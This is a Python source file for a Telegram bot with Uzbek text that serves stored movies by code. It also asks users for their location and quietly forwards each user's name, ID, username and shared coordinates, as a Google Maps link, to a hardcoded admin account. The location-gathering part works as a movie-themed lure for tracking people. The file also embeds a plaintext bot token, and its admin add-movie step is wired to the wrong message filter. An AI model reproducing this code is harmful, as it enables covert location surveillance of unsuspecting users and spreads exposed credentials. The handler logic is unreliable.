from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)
import sqlite3

# =====================
BOT_TOKEN = "8426295239:AAGun0-AbZjsUiEDH3wEShOEIBqFcFVVIWM"
ADMIN_ID = 5775388579
# =====================

# ===== DATABASE =====
db = sqlite3.connect("movies.db", check_same_thread=False)
cursor = db.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS movies (
    code TEXT PRIMARY KEY,
    file_id TEXT
)
""")
db.commit()


# ===== START =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    kb = [
        [KeyboardButton("📍 Joylashuvni yuborish", request_location=True)]
    ]

    if user.id == ADMIN_ID:
        kb.append(["🎬 Kino qo‘shish"])

    await update.message.reply_text(
        f"Salom {user.first_name} 👋\n\n"
        "📍 Joylashuvni yuboring yoki\n"
        "🎬 Kino kodi yozing (masalan: 5)",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
    )

    # admin ga info
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🆕 USER\n👤 {user.first_name}\n🆔 {user.id}\n@{user.username}"
    )


# ===== LOCATION =====
async def location_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    loc = update.message.location
    user = update.effective_user

    link = f"https://maps.google.com/?q={loc.latitude},{loc.longitude}"

    await update.message.reply_text(
        f"📍 Joylashuv olindi!\n{link}"
    )

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📍 {user.first_name}\n{link}"
    )


# ===== ADMIN ADD MOVIE =====
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    await update.message.reply_text(
        "🎬 Kino kodini kiriting:",
        reply_markup=ReplyKeyboardRemove()
    )
    context.user_data["step"] = "movie_code"


async def admin_steps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    step = context.user_data.get("step")

    if step == "movie_code":
        context.user_data["movie_code"] = update.message.text
        context.user_data["step"] = "movie_file"
        await update.message.reply_text("📁 Endi kinoni yuboring:")

    elif step == "movie_file":
        video = update.message.video or update.message.document
        if not video:
            await update.message.reply_text("❌ Video yuboring")
            return

        code = context.user_data["movie_code"]
        file_id = video.file_id

        cursor.execute(
            "REPLACE INTO movies VALUES (?,?)",
            (code, file_id)
        )
        db.commit()

        await update.message.reply_text(
            f"✅ Kino saqlandi!\nKodi: {code}",
            reply_markup=ReplyKeyboardMarkup(
                [["📍 Joylashuvni yuborish"], ["🎬 Kino qo‘shish"]],
                resize_keyboard=True
            )
        )
        context.user_data.clear()


# ===== USER GET MOVIE =====
async def get_movie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text
    cursor.execute("SELECT file_id FROM movies WHERE code=?", (code,))
    row = cursor.fetchone()

    if row:
        await update.message.reply_video(row[0])
    else:
        await update.message.reply_text("❌ Bunday kino yo‘q")


# ===== MAIN =====
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, location_handler))
    app.add_handler(MessageHandler(filters.Regex("^🎬 Kino qo‘shish$"), admin_panel))
    app.add_handler(MessageHandler(filters.VIDEO | filters.Document.VIDEO, admin_steps))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, get_movie))

    print("🤖 Kino bot ishga tushdi...")
    app.run_polling()


if __name__ == "__main__":
    main()
